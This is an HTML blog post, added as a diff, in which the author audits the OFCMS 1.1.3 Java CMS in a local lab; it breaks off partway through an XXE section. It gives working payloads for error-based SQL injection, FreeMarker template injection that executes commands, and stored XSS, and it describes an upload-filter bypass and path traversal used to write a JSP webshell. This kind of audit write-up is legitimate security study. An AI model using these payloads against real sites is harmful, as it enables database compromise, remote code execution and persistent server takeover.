@@ -1,0 +1,856 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.jpg">
+  <link rel="icon" href="/img/fluid.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="huangdi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="OFCMS 1.1.3 代码审计(Java)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OFCMS 1.1.3 代码审计(Java)">
+<meta property="og:url" content="http://huang-d1.github.io/2025/07/13/OFCMS%201.1.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(Java)/index.html">
+<meta property="og:site_name" content="huangdi&#39;s blog">
+<meta property="og:description" content="OFCMS 1.1.3 代码审计(Java)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms01.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms02.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms03.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms04.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms05.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms06.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms07.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms08.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms09.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms10.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms11.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms12.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms13.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms15.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms14.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms16.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms17.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms18.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms19.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms20.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms21.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms22.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms23.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms24.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/ofcms/ofcms25.png">
+<meta property="article:published_time" content="2025-07-13T14:48:42.483Z">
+<meta property="article:modified_time" content="2025-07-13T14:50:57.938Z">
+<meta property="article:author" content="huangdi">
+<meta property="article:tag" content="Java代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://huang-d1.github.io/img/ofcms/ofcms01.png">
+  
+  
+  
+  <title>OFCMS 1.1.3 代码审计(Java) - huangdi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"huang-d1.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>huang-d1&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="OFCMS 1.1.3 代码审计(Java)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-13 22:48" pubdate>
+          2025年7月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">OFCMS 1.1.3 代码审计(Java)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="OFCMS-1-1-3-代码审计-Java"><a href="#OFCMS-1-1-3-代码审计-Java" class="headerlink" title="OFCMS 1.1.3 代码审计(Java)"></a>OFCMS 1.1.3 代码审计(Java)</h2><p>参考文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/YouthBelief/article/details/122978328">【Java代码审计】OFCMS 1.1.3 审计_ofcms-v1.1.3 idea-CSDN博客</a></li>
+<li><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1229">奇安信攻防社区-记又一次Java代码审计 (butian.net)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/16217471.html#api">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a></li>
+<li>[【Java代码审计】ofcms 1.1.3 | Fan的小酒馆 (fanygit.github.io)](<a target="_blank" rel="noopener" href="https://fanygit.github.io/2022/10/09/[Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]ofcms">https://fanygit.github.io/2022/10/09/[Java代码审计]ofcms</a> 1.1.3&#x2F;)</li>
+</ul>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>项目地址：<a target="_blank" rel="noopener" href="https://gitee.com/oufu/ofcms/tree/V1.1.3/">https://gitee.com/oufu/ofcms/tree/V1.1.3/</a></p>
+<p>在IDEA中打开项目后，添加一个tomcat服务器</p>
+<p><img src="/img/ofcms/ofcms01.png" srcset="/img/loading.gif" lazyload></p>
+<p>部署工件</p>
+<p><img src="/img/ofcms/ofcms02.png" srcset="/img/loading.gif" lazyload></p>
+<p>等待maven配置后打开网站</p>
+<p>自动安装报错</p>
+<p><img src="/img/ofcms/ofcms03.png" srcset="/img/loading.gif" lazyload></p>
+<p>开始手动安装</p>
+<p>首先在MySQL中创建空的ofcms数据库，然后将 <code>ofcms-V1.1.3/doc/sql/ofcms-v1.1.3.sql</code>文件导入到自己创建的数据库中(运行sql文件)</p>
+<p>将数据库配置文件<code>ofcms-V1.1.3/ofcms-admin/src/main/resources/dev/conf/db-config.properties</code>文件名修改为<code>db.properties</code>，然后修改文件中的数据库配置信息</p>
+<p><img src="/img/ofcms/ofcms04.png" srcset="/img/loading.gif" lazyload></p>
+<p>启动项目，访问程序后台地址：<br><code>http://localhost:8080/ofcms_admin_war/admin/index.html</code></p>
+<p>默认账号和密码：admin&#x2F;123456</p>
+<p>成功登录</p>
+<h3 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h3><ul>
+<li><p>先看pom.xml文件，关注引入的依赖</p>
+<p>此cms引入了log4j的依赖，之后可以关注一下有无利用点</p>
+</li>
+<li><p>打开网站时在软件介绍处可以看到使用的是mybatis，freemarker模板，shiro安全框架，mysql数据库</p>
+</li>
+<li><p>翻看目录结构判断控制后台登录的核心代码大概都在ofcms-admin内</p>
+</li>
+<li><p>搜索关键字逐个排查漏洞(白盒)+在网页寻找功能点测试(黑盒)</p>
+</li>
+</ul>
+<p>白盒审计时直接使用工具SAST(搜索关键字)，省去逐个搜索关键字的时间</p>
+<p><img src="/img/ofcms/ofcms05.png" srcset="/img/loading.gif" lazyload></p>
+<p>逐个排查高危与中危漏洞，与网页功能点对应</p>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>工具审出的第一条sql注入漏洞回到源代码中找到对应点</p>
+<p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;system&#x2F;SystemGenerateController.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span> &#123;<br>		<span class="hljs-keyword">try</span> &#123;<br>			<span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> getPara(<span class="hljs-string">&quot;sql&quot;</span>);<br>			Db.update(sql);<br>			rendSuccessJson();<br>		&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>			e.printStackTrace();<br>			rendFailedJson(ErrorCode.get(<span class="hljs-string">&quot;9999&quot;</span>), e.getMessage());<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到create()方法接收了用户输入的一条sql语句，并且无过滤</p>
+<p>追踪getPara方法发现，此方法只是接收参数，无过滤</p>
+<p>追踪Db.update方法，一直追踪到</p>
+<p>jfinal&#x2F;jfinal&#x2F;3.2&#x2F;jfinal-3.2.jar!&#x2F;com&#x2F;jfinal&#x2F;plugin&#x2F;activerecord&#x2F;DbPro.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Config config, Connection conn, String sql, Object... paras)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pst</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br>        config.dialect.fillStatement(pst, paras);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> pst.executeUpdate();<br>        DbKit.close(pst);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>看到执行了传入的sql语句</p>
+<p>虽然此方法创建预编译的 SQL 语句对象 <code>pst</code>，但是并未使用预编译写法(占位符，固定sql语句)，而是将传入的sql语句直接作为一个参数执行</p>
+<p>判断此处存在sql注入</p>
+<p>在网页寻找功能点：</p>
+<p>由于此段代码在admin文件夹下，判断为后台功能点</p>
+<p>在后台系统设置-&gt;代码生成-&gt;增加-&gt;输入sql</p>
+<p>测试后发现能够报错，尝试报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">update of_cms_link set link_name=updatexml(1,concat(0x7e,(user())),0) where link_id = 4<br></code></pre></td></tr></table></figure>
+
+<p>成功注入</p>
+<p><img src="/img/ofcms/ofcms06.png" srcset="/img/loading.gif" lazyload></p>
+<p>注：</p>
+<p>刚刚可以看到使用了方法<mark>PreparedStatement.executeUpdate()</mark></p>
+<p><code>executeUpdate()</code> 适用于执行：</p>
+<ul>
+<li><code>INSERT</code></li>
+<li><code>UPDATE</code></li>
+<li><code>DELETE</code></li>
+<li><code>CREATE</code>, <code>DROP</code>, <code>ALTER</code> 等 DDL 语句</li>
+</ul>
+<p>payload构造应该使用这些语句</p>
+<h4 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h4><p>在一开始查看软件说明时就可以了解到此源代码使用了freemarker模板引擎</p>
+<p>在网页后台查看功能点时看到修改模板文件的功能</p>
+<p><img src="/img/ofcms/ofcms07.png" srcset="/img/loading.gif" lazyload></p>
+<p>在源代码中定位控制代码</p>
+<p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;TemplateController.java</p>
+<p>save方法</p>
+<p><img src="/img/ofcms/ofcms08.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到对模板内容控制的代码只有框起来的两行，下面直接使用writeString方法写入并执行</p>
+<p>追踪红框中调用的getRequest()与getParameter()方法，发现没有任何过滤</p>
+<p>在网上查找freemarker模板ssti注入利用</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/16217471.html#api">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
+<p>payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; <br>  $&#123; ex(&quot;calc&quot;) &#125;<br></code></pre></td></tr></table></figure>
+
+<p>不知道为什么，我的只有这个payload是可以弹出计算器的，可以尝试多种payload</p>
+<p><img src="/img/ofcms/ofcms09.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="前台存储型xss"><a href="#前台存储型xss" class="headerlink" title="前台存储型xss"></a>前台存储型xss</h4><p>在网页寻找功能点时看到前台新闻页面有评论功能</p>
+<p>发表评论通过开发者工具-&gt;网络功能，查看消息头，判断控制此功能的代码位置</p>
+<p><img src="/img/ofcms/ofcms10.png" srcset="/img/loading.gif" lazyload></p>
+<p>在源码中查找</p>
+<p>ofcms-api&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F; <mark>api&#x2F;v1&#x2F;CommentApi.java</mark></p>
+<p>save方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 获取请求参数</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> getParamsMap();<br>        <span class="hljs-comment">// 获取用户真实 IP 地址，并添加到参数中</span><br>        params.put(<span class="hljs-string">&quot;comment_ip&quot;</span>, IpKit.getRealIp(getRequest()));<br>        <span class="hljs-comment">// 调用 SQL 模板 &quot;cms.comment.save&quot; 并执行更新操作（插入评论）</span><br>        Db.update(Db.getSqlPara(<span class="hljs-string">&quot;cms.comment.save&quot;</span>, params));<br>        <span class="hljs-comment">// 返回成功的 JSON 响应</span><br>        rendSuccessJson();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-comment">// 如果出现异常，打印堆栈信息</span><br>        e.printStackTrace();<br>        <span class="hljs-comment">// 返回失败的 JSON 响应</span><br>        rendFailedJson();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>追踪getSqlPara函数并未发现过滤，此段代码只是直接获取评论内容随后在数据库中更新</p>
+<p>使用xss payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>测试</p>
+<p>看到其他师傅的测试是可以正常弹窗的，我的有404报错，不知道为什么</p>
+<p><img src="/img/ofcms/ofcms11.png" srcset="/img/loading.gif" lazyload></p>
+<p>在后台直接编辑评论是可以正常弹窗的</p>
+<h4 id="后台文件上传01"><a href="#后台文件上传01" class="headerlink" title="后台文件上传01"></a>后台文件上传01</h4><p>在网站寻找功能点找到文件上传</p>
+<p>内容管理-&gt;栏目管理-&gt;关于我们-&gt;编辑-&gt;栏目图上传</p>
+<p>抓取数据包</p>
+<p><img src="/img/ofcms/ofcms12.png" srcset="/img/loading.gif" lazyload></p>
+<p>找到路由&#x2F;ofcms_admin_war&#x2F;admin&#x2F;comn&#x2F;service&#x2F;upload.js</p>
+<p>全局搜索&#x2F;comn&#x2F;service&#x2F;</p>
+<p>在源码中定位</p>
+<p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;ComnController.java</p>
+<p>upload方法</p>
+<p><img src="/img/ofcms/ofcms13.png" srcset="/img/loading.gif" lazyload></p>
+<p>在此处下断点进行调试</p>
+<p>getFile方法-&gt;getFiles方法-&gt;MultipartRequest类-&gt;wrapMultipartRequest方法-&gt;isSafeFile方法</p>
+<p>getFiles方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;UploadFile&gt; <span class="hljs-title function_">getFiles</span><span class="hljs-params">(String uploadPath)</span> &#123;<br>    <span class="hljs-comment">// 如果当前请求不是 MultipartRequest 类型（即非文件上传请求）</span><br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">this</span>.request <span class="hljs-keyword">instanceof</span> MultipartRequest)) &#123;<br>        <span class="hljs-comment">// 将当前请求转换为 MultipartRequest，并指定文件上传的保存路径</span><br>        <span class="hljs-built_in">this</span>.request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MultipartRequest</span>(<span class="hljs-built_in">this</span>.request, uploadPath);<br>    &#125;<br>    <span class="hljs-comment">// 将请求强制转换为 MultipartRequest，并获取上传的文件列表</span><br>    <span class="hljs-keyword">return</span> ((MultipartRequest)<span class="hljs-built_in">this</span>.request).getFiles();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>该方法的作用是获取上传的文件列表，具体步骤如下：<br>  1.判断当前请求是否为文件上传类型（MultipartRequest）；<br>  2.如果不是，则将其包装成一个支持文件上传的请求对象，并指定上传路径；<br>  3.最后，从请求中获取并返回上传的文件列表（List<UploadFile>）。</p>
+<p>wrapMultipartRequest方法中可以看到调用了isSafeFile方法</p>
+<p><img src="/img/ofcms/ofcms15.png" srcset="/img/loading.gif" lazyload></p>
+<p>isSafeFile方法方法用于判断上传的文件类型是否是.jsp或.jspx文件</p>
+<p>将文件后缀首尾去空及转换成小写</p>
+<p><img src="/img/ofcms/ofcms14.png" srcset="/img/loading.gif" lazyload></p>
+<p>动态调试时也可以看到经过了复杂的判断，可以看到有Content-Type和后缀验证</p>
+<p>此处是黑名单绕过</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_81864699/article/details/143099369">文件上传绕过总结——详细保姆篇-CSDN博客</a></p>
+<p>尝试截断%00，与后缀jspx绕过，能够成功上传，但是无法识别</p>
+<p>尝试多种后是利用了1.jsp::$DATA(windows特性，上传至windows服务器后为1.jsp)成功上传</p>
+<p><img src="/img/ofcms/ofcms16.png" srcset="/img/loading.gif" lazyload></p>
+<p>注：</p>
+<p>动态调试后发现<mark>上传后的图片不在网站路径下</mark></p>
+<p>在tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;upload&#x2F;image路径下</p>
+<h4 id="后台文件上传02"><a href="#后台文件上传02" class="headerlink" title="后台文件上传02"></a>后台文件上传02</h4><p>感觉没想到文件上传漏洞会以这种形式呈现</p>
+<p>如果不看文章自己肯定是想不到的</p>
+<p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;TemplateController.java</p>
+<p>save方法</p>
+<p><img src="/img/ofcms/ofcms17.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这里对文件名及文件内容都没有限制，虽然此处控制的是网页模板修改功能，但是看代码是可以通过数据包上传文件的，是一个可利用的接口</p>
+<p>抓取请求数据包往服务器写入webshell，在文件名中插入<code>../</code>路径跳转符，控制在static目录下写入恶意JSP文件</p>
+<p>选择一个jsp恶意文件将内容url编码后写入数据包file_content中</p>
+<p>file_name改为..&#x2F;..&#x2F;..&#x2F;static&#x2F;shell.jsp</p>
+<p>(原index.html在&#x2F;tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;WEB-INF&#x2F;page&#x2F;default&#x2F;目录下，static与WEB-INF文件夹在同一级)</p>
+<p><mark>不会上传到网站根目录下！！！</mark></p>
+<p><img src="/img/ofcms/ofcms18.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到顺利上传</p>
+<p>D:&#x2F;tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;static</p>
+<p><img src="/img/ofcms/ofcms19.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问一下</p>
+<p><img src="/img/ofcms/ofcms20.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到是能够正常访问的，就是需要改一下编码</p>
+<h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>在外部库中可以看到是有解析xml文档的相关资源包的</p>
+<p><img src="/img/ofcms/ofcms21.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试搜索xml关键字</p>
+<p>在com.ofsoft.cms.admin.controller.ReprotAction类的expReport方法中，接收用户输入的j参数后，拼接生成文件路径，这里没有进行过滤，可以穿越到其它目录，但是限制了文件后缀为jrxml，接下来会调用<code>JasperCompileManager.compileReport()</code>方法</p>
+<p><code>.jrxml</code> 是JasperReports 报表模板源文件的文件扩展名，它是JasperReports 的 XML 格式报表模板</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">expReport</span><span class="hljs-params">()</span> &#123;<br>		<span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> getResponse();<br>		Map&lt;String, Object&gt; hm = getParamsMap();<br>    <br>    	<span class="hljs-comment">//获取参数 j，即报表模板名（不含扩展名）；</span><br>        <span class="hljs-comment">//拼接模板的完整路径；</span><br>        <span class="hljs-comment">//用 PathKit.getWebRootPath() 获取 Web 根目录路径；</span><br>        <span class="hljs-comment">//创建一个 File 对象指向 .jrxml 模板文件。</span><br>		<span class="hljs-type">String</span> <span class="hljs-variable">jrxmlFileName</span> <span class="hljs-operator">=</span> (String) hm.get(<span class="hljs-string">&quot;j&quot;</span>);<br>		jrxmlFileName = <span class="hljs-string">&quot;/WEB-INF/jrxml/&quot;</span> + jrxmlFileName + <span class="hljs-string">&quot;.jrxml&quot;</span>;<br>		<span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(PathKit.getWebRootPath() + jrxmlFileName);<br>    <br>		<br>    	<span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> (String) hm.get(<span class="hljs-string">&quot;reportName&quot;</span>);<br>		log.info(<span class="hljs-string">&quot;报表文件名[&#123;&#125;]&quot;</span>, 